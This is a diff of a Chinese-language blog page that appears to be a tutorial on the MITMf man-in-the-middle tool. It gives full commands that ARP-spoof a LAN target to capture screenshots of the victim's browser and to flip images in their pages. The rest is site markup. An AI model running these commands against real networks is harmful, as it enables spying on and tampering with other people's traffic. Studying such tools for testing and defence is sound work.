+<h4 id="Screenshotter模块"><a href="#Screenshotter模块" class="headerlink" title="Screenshotter模块"></a>Screenshotter模块</h4><p>这个可以说是MITMf，甚至是在内网渗透工具中，最高级的功能之一了。支持对目标浏览器进行截屏。可以想象，攻击者将直接看到受害人的浏览截屏，隐私全无！这个插件是基于HTML5写的，默认截屏时间间隔是10s，使用–interval可以设置时间间隔。（不是很实用，保存的图片大多是网站框架图，具体看的什么获取的很慢）</p>
+<pre><code class="language-html">python ./mitmf.py -i eth0 --spoof --arp --gateway 192.168.123.1 --target 192.168.123.162 --screen
+</code></pre>
 <p>受害者正在看新闻。。。<br><img src="http://img.cdn.cuittk.cn/ertmxnbp4lz3eskmppdh3ga0v0.png" alt=""></p>
-<h4 id="Upsidedownternet模块-恶搞一下"><a href="#Upsidedownternet模块-恶搞一下" class="headerlink" title="Upsidedownternet模块(恶搞一下)"></a>Upsidedownternet模块(恶搞一下)</h4><p>将受害者浏览器中的图片180度颠倒<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./mitmf.py -i eth0 --spoof  --arp --gateway 192.168.123.1 --target 192.168.123.162 --upsidedownternet</div></pre></td></tr></table></figure></p>
+<h4 id="Upsidedownternet模块-恶搞一下"><a href="#Upsidedownternet模块-恶搞一下" class="headerlink" title="Upsidedownternet模块(恶搞一下)"></a>Upsidedownternet模块(恶搞一下)</h4><p>将受害者浏览器中的图片180度颠倒</p>
+<pre><code class="language-html">python ./mitmf.py -i eth0 --spoof  --arp --gateway 192.168.123.1 --target 192.168.123.162 --upsidedownternet
+</code></pre>
 <p><img src="http://img.cdn.cuittk.cn/9psqsr093ki0mgwkzodsuengvt.png" alt=""></p>
 
       
@@ -506,7 +622,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -634,7 +750,7 @@
 
 
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
+<script src="/js/prism/prism.js" async></script>
         
 <div class="busuanzi-count">
   <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
